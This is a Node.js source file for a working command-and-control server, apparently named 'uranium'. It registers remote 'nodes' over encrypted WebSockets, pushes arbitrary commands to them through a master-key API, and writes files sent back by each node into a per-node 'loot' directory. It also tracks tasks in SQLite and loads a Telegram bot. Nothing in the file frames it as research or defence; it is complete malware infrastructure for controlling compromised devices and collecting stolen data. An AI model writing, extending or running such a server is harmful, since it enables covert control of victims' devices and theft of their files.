require('dotenv').config();
const express = require('express');
const { WebSocketServer } = require('ws');
const crypto = require('crypto');
const http = require('http');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json({ limit: '50mb' }));
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const MASTER_KEY = process.env.MASTER_KEY;
if (!MASTER_KEY || MASTER_KEY.length < 16) {
    console.error('[!] MASTER_KEY missing or too short');
    process.exit(1);
}

const SECRET_KEY = crypto.scryptSync(MASTER_KEY, 'uranium-c2-salt-v11', 32);
const STORAGE_DIR = path.join(__dirname, 'loot');
fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        node_id TEXT,
        action TEXT,
        status TEXT DEFAULT 'PENDING',
        result TEXT,
        created_at INTEGER,
        completed_at INTEGER
    )`);
});

function encrypt(text) {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', SECRET_KEY, iv);
    const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()]);
    const tag = cipher.getAuthTag();
    return Buffer.concat([iv, encrypted, tag]).toString('base64');
}

function decrypt(base64Data) {
    try {
        const data = Buffer.from(base64Data, 'base64');
        const iv = data.subarray(0, 12);
        const encrypted = data.subarray(12, data.length - 16);
        const tag = data.subarray(data.length - 16);
        const decipher = crypto.createDecipheriv('aes-256-gcm', SECRET_KEY, iv);
        decipher.setAuthTag(tag);
        return Buffer.concat([decipher.update(encrypted), decipher.final()]).toString('utf8');
    } catch (e) { return null; }
}

const nodes = new Map();

wss.on('connection', (ws, req) => {
    const nodeId = req.headers['x-node-id'];
    const nodeModel = req.headers['x-node-model'] || 'Unknown';
    if (!nodeId) return ws.close(1008, 'No ID');

    db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`,
        [nodeId, nodeModel, Date.now()]);
    nodes.set(nodeId, ws);
    console.log(`[+] Node online: ${nodeId} (${nodeModel})`);

    ws.send(encrypt(JSON.stringify({ cmd: 'SYNC_READY', status: 'ONLINE' })));

    ws.on('message', (message) => {
        const raw = decrypt(message.toString());
        if (!raw) return;
        try {
            const data = JSON.parse(raw);

            if (data.type === 'data') {
                const safeName = path.basename(data.filename || `dump_${Date.now()}.bin`);
                const saveDir = path.join(STORAGE_DIR, nodeId);
                if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });
                const buffer = data.isBase64
                    ? Buffer.from(data.content, 'base64')
                    : Buffer.from(data.content, 'utf8');
                fs.writeFileSync(path.join(saveDir, safeName), buffer);
                console.log(`[+] File from ${nodeId}: ${safeName} (${buffer.length}b)`);
            }

            if (data.type === 'result') {
                db.run(`UPDATE tasks SET status='DONE', result=?, completed_at=? WHERE id=?`,
                    [JSON.stringify(data.result || {}), Date.now(), data.taskId]);
            }

            if (data.type === 'ping') {
                db.run(`UPDATE nodes SET last_seen=? WHERE id=?`, [Date.now(), nodeId]);
                ws.send(encrypt(JSON.stringify({ cmd: 'PONG' })));
            }
        } catch (e) {
            console.error(`[!] Parse error from ${nodeId}: ${e.message}`);
        }
    });

    ws.on('close', () => {
        nodes.delete(nodeId);
        console.log(`[-] Node offline: ${nodeId}`);
    });
});

app.post('/api/command', (req, res) => {
    if (req.headers['x-master-key'] !== MASTER_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const { nodeId, action } = req.body;
    if (!nodeId || !action) return res.status(400).json({ error: 'nodeId and action required' });

    const ws = nodes.get(nodeId);
    if (!ws) return res.status(404).json({ error: 'Node offline' });

    db.run(`INSERT INTO tasks (node_id, action, created_at) VALUES (?, ?, ?)`,
        [nodeId, action, Date.now()], function (err) {
            if (err) return res.status(500).json({ error: err.message });
            const taskId = this.lastID;
            ws.send(encrypt(JSON.stringify({ cmd: action, taskId, timestamp: Date.now() })));
            res.json({ status: 'Fired', node: nodeId, action, taskId });
        });
});

app.get('/api/nodes', (req, res) => {
    if (req.headers['x-master-key'] !== MASTER_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    db.all(`SELECT * FROM nodes ORDER BY last_seen DESC`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ nodes: rows, online: Array.from(nodes.keys()) });
    });
});

app.get('/api/tasks', (req, res) => {
    if (req.headers['x-master-key'] !== MASTER_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    db.all(`SELECT * FROM tasks ORDER BY id DESC LIMIT 200`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ tasks: rows });
    });
});

app.get('/health', (req, res) => {
    res.json({
        nodes: Array.from(nodes.keys()),
        uptime: process.uptime(),
        memory: process.memoryUsage().rss
    });
});

try {
    require('./telegram_bot.js');
    console.log('[+] Telegram bot loaded');
} catch (e) {
    console.warn(`[!] telegram_bot.js not loaded: ${e.message}`);
}

server.listen(process.env.PORT || 3000, () => {
    console.log(`[+] C2 Online on :${process.env.PORT || 3000}`);
});
